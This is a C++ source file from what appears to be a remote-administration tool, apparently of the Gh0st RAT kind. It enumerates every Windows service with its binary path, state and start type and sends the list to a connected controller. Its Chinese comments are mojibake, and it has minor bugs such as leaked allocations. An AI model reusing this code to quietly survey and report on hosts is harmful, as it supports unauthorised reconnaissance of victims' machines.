// ServerManager.cpp: implementation of the CServerManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ServerManager.h"
#include "Common.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CServerManager::CServerManager(CClientSocket *pClient) : CManager(pClient)
{

	 SendServicesList();
}


void CServerManager::SendServicesList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getServerList();
	if (lpBuffer == NULL)
		return;	
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}



LPBYTE CServerManager::getServerList()
{
     LPQUERY_SERVICE_CONFIG ServicesInfo = NULL;
	LPENUM_SERVICE_STATUS lpServices    = NULL; 
	LPBYTE			lpBuffer = NULL;
	DWORD    nSize = 0; 
	DWORD    n; 
	DWORD    nResumeHandle = 0; 
	DWORD	 dwServiceType = SERVICE_WIN32; 
	DWORD	 dwLength = 0;
	DWORD	 dwOffset = 0;
	char	 runway[256] = {0};
	char	 autorun[256] = {0};

	SC_HANDLE schSCManager = NULL; 
	BOOL     Flag = FALSE; 

	if((schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_QUERY_LOCK_STATUS))==NULL)
	{
				OutputDebugString("OpenSCManager Error\n");

				
	}
	lpServices = (LPENUM_SERVICE_STATUS) LocalAlloc(LPTR, 64*1024);        // Allocate Ram 

	EnumServicesStatus(schSCManager,
					   dwServiceType, 
					   SERVICE_STATE_ALL,
					   (LPENUM_SERVICE_STATUS)lpServices, 
						64 * 1024, 
						&nSize, 
						&n, 
						&nResumeHandle);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);
	
	lpBuffer[0] = TOKEN_SERVERLIST;
	dwOffset = 1;

	for (unsigned long i = 0; i < n; i++)  // Display The Services,��ʾ���еķ���
	{ 
		SC_HANDLE service = NULL;
		DWORD     nResumeHandle = 0; 

		service=OpenService(schSCManager,lpServices[i].lpServiceName,SERVICE_ALL_ACCESS);//�򿪵�ǰָ������ľ��


		if (service==NULL)
		{
			break;
		}
		ServicesInfo = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 4*1024);        // Allocate Ram 

		QueryServiceConfig(service,ServicesInfo,4*1024,&nResumeHandle); //��ѯ������������

		if ( lpServices[i].ServiceStatus.dwCurrentState!=SERVICE_STOPPED) //����״̬
		{
			ZeroMemory(runway, sizeof(runway));
			lstrcat(runway,"����");
		}
		else
		{
			ZeroMemory(runway, sizeof(runway));
			lstrcat(runway,"ֹͣ");
		}

		if(2==ServicesInfo->dwStartType) //�������
		{
			ZeroMemory(autorun, sizeof(autorun));
			lstrcat(autorun,"�Զ�");
		}
		if(3==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			lstrcat(autorun,"�ֶ�");
		}
		if(4==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			lstrcat(autorun,"����");
		}

		dwLength = sizeof(DWORD) + lstrlen(lpServices[i].lpDisplayName) 
		+ lstrlen(ServicesInfo->lpBinaryPathName) + lstrlen(lpServices[i].lpServiceName)
		+ lstrlen(runway) + lstrlen(autorun) + 2;
		// ������̫С�������·�����
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

		memcpy(lpBuffer + dwOffset, lpServices[i].lpDisplayName, lstrlen(lpServices[i].lpDisplayName) + 1);
		dwOffset += lstrlen(lpServices[i].lpDisplayName) + 1;//��ʵ����
		
		memcpy(lpBuffer + dwOffset, lpServices[i].lpServiceName, lstrlen(lpServices[i].lpServiceName) + 1);
		dwOffset += lstrlen(lpServices[i].lpServiceName) + 1;//��ʾ����

		memcpy(lpBuffer + dwOffset, ServicesInfo->lpBinaryPathName, lstrlen(ServicesInfo->lpBinaryPathName) + 1);
		dwOffset += lstrlen(ServicesInfo->lpBinaryPathName) + 1;//·��

		memcpy(lpBuffer + dwOffset, runway, lstrlen(runway) + 1);//����״̬
		dwOffset += lstrlen(runway) + 1;			

		memcpy(lpBuffer + dwOffset, autorun, lstrlen(autorun) + 1);//������״̬
		dwOffset += lstrlen(autorun) + 1;
	}

	CloseServiceHandle(schSCManager);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;						

}

CServerManager::~CServerManager()
{

}
